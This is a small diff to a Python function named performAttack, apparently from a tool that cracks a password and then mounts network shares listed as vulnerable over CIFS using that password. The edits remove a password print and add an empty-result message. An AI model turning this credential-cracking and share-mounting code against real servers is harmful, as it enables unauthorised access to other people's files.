@@ -40,8 +40,6 @@ def performAttack(location, serverIP, username, password=None):
 		f.close()
 		
 		print ("Cracked Password:" + password)
-	else:
-		print ("password is " + password)
 	try:	
 		shutil.rmtree(location)	
 	except FileNotFoundError:
@@ -55,6 +53,8 @@ def performAttack(location, serverIP, username, password=None):
 	f.close()
 	f = open('vulnerableMountPoints.txt', 'r')
 	mountpoints = parseVulnerabilitiesFile(f)
+	if len(mountpoints) == 0:
+		print ("No mountpoint found")
 	f.close()
 	for mountpoint in mountpoints:
 		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
